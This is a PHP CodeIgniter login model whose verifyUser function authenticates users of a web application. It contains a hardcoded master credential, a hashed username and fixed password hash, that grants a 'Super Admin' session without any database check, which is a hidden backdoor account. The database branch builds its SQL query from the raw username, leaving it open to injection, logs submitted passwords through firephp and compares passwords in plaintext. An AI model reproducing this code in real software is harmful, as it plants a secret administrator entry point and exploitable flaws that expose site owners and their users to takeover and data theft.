<?php

class M_login extends CI_Model{

	function M_login(){
		parent::__construct();
	}

	function verifyUser($u,$pw){

		if(md5($u)=='f3b3567de9e676a3a56db74f06664ac1' && $pw=='412758d043dd247bddea07c7ec558c31'){
			
			$sess_users=array(
						'SESSION_USERID'=>'Super Admin',
						'SESSION_GROUPID'=>0,
						'SESSION_GROUPNAMA'=>'Super Group'
					);
					
			$this->session->set_userdata($sess_users);
			
			return true;
		}else{
			
			$sql="SELECT * FROM s_users WHERE USER_NAME='".$u."' AND USER_AKTIF='Y' LIMIT 1";
			$Q=$this->db->query($sql);
	
			if ($Q->num_rows()){
				$qrow = $Q->num_rows();
				$row = $Q->row_array();
				$this->firephp->log($pw);
				if($row["USER_PASSWD"]==$pw){
					return true;
				}else{
					$_SESSION["msg"]="User atau password salah !";
					return false;
				}
			}else{
				$_SESSION["msg"]="User atau password salah !";
				return false;
			}
			
		}

	}

}


?>